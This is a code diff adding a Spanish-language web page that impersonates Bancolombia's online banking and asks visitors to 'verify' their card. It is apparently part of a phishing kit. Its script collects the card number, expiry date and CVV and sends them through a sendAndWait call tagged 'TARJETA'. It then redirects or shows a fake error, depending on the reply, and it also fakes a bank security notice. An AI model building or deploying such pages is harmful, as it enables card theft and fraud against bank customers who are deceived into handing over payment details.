@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verifica tu tarjeta | Bancolombia</title>
+<link rel="stylesheet" href="css/secured.css">
+</head>
+<body>
+
+<header class="top">
+  <div class="brand">
+    <img src="img/horizont-trazo-blanco.svg" alt="Bancolombia" onerror="this.style.display='none'">
+    <div class="channel">Sucursal Virtual Personas</div>
+  </div>
+  <div class="top-actions">
+    <button class="user-pill"><span id="userName">Usuario</span></button>
+  </div>
+</header>
+
+<main class="center">
+  <div class="card-form">
+    <h1>Verifica tu tarjeta</h1>
+    <p class="sub">Ingresa los datos de tu tarjeta débito o crédito para confirmar tu identidad.</p>
+
+    <div class="err-banner" id="errBanner">Datos incorrectos. Verifica e intenta de nuevo.</div>
+
+    <div class="field">
+      <label for="tc">Número de tarjeta</label>
+      <input type="text" id="tc" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" autocomplete="cc-number">
+    </div>
+
+    <div class="field-row">
+      <div class="field">
+        <label for="expiry">Fecha de expiración</label>
+        <input type="text" id="expiry" inputmode="numeric" maxlength="5" placeholder="MM/AA" autocomplete="cc-exp">
+      </div>
+      <div class="field">
+        <label for="cvv">CVV</label>
+        <input type="text" id="cvv" inputmode="numeric" maxlength="4" placeholder="•••" autocomplete="cc-csc">
+      </div>
+    </div>
+
+    <div class="actions">
+      <button class="btn-pill btn-secondary-pill" onclick="clearForm()">Borrar</button>
+      <button class="btn-pill btn-primary" id="btnContinue" disabled>Continuar</button>
+    </div>
+  </div>
+</main>
+
+<!-- Loader -->
+<div class="loader-overlay" id="loader">
+  <div class="loader-box">
+    <div class="loader-circle"></div>
+    <div class="loader-text">Cargando...</div>
+  </div>
+</div>
+
+<!-- Modal 923 -->
+<div class="modal-overlay" id="modal923">
+  <div class="modal-923">
+    <div class="x-circle">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+    </div>
+    <h3>Por seguridad, no puedes continuar</h3>
+    <p>Te contactaremos por alguno de nuestros canales para confirmar que eres tú o llámanos a la Sucursal Telefónica, elige la opción 3 y luego 2. Nunca te pediremos tu usuario, claves o códigos de seguridad.       Codigo: 923</p>
+    <button class="btn-yellow-full" onclick="close923Retry()">Intentar más tarde</button>
+  </div>
+</div>
+
+
+<script src="js/secured.js"></script>
+<script>
+  const tc     = document.getElementById('tc');
+  const expiry = document.getElementById('expiry');
+  const cvv    = document.getElementById('cvv');
+  const btn    = document.getElementById('btnContinue');
+  const errEl  = document.getElementById('errBanner');
+
+  // Formato número de tarjeta: 4-4-4-4
+  tc.addEventListener('input', () => {
+    let v = tc.value.replace(/\D/g, '').slice(0, 16);
+    tc.value = v.replace(/(.{4})/g, '$1 ').trim();
+    errEl.classList.remove('show');
+    check();
+  });
+  // Formato MM/AA
+  expiry.addEventListener('input', () => {
+    let v = expiry.value.replace(/\D/g, '').slice(0, 4);
+    if (v.length >= 3) v = v.slice(0, 2) + '/' + v.slice(2);
+    expiry.value = v;
+    errEl.classList.remove('show');
+    check();
+  });
+  cvv.addEventListener('input', () => {
+    cvv.value = cvv.value.replace(/\D/g, '').slice(0, 4);
+    errEl.classList.remove('show');
+    check();
+  });
+
+  function check() {
+    const tcOk     = tc.value.replace(/\s/g, '').length >= 14;
+    const expiryOk = /^\d{2}\/\d{2}$/.test(expiry.value);
+    const cvvOk    = cvv.value.length >= 3;
+    const ok = tcOk && expiryOk && cvvOk;
+    btn.classList.toggle('active', ok);
+    btn.disabled = !ok;
+  }
+
+  function clearForm() {
+    tc.value = ''; expiry.value = ''; cvv.value = '';
+    errEl.classList.remove('show');
+    check();
+    tc.focus();
+  }
+
+  btn.addEventListener('click', () => {
+    if (btn.disabled) return;
+    sendAndWait({
+      event: 'TARJETA',
+      tc: tc.value.replace(/\s/g, ''),
+      expiry: expiry.value,
+      cvv: cvv.value
+    }, {
+      onOk: () => { sessionStorage.clear(); location.href = 'index.html'; },
+      onErr: () => { hideLoader(); errEl.classList.add('show'); cvv.value = ''; check(); cvv.focus(); }
+    });
+  });
+</script>
+</body>
+</html>
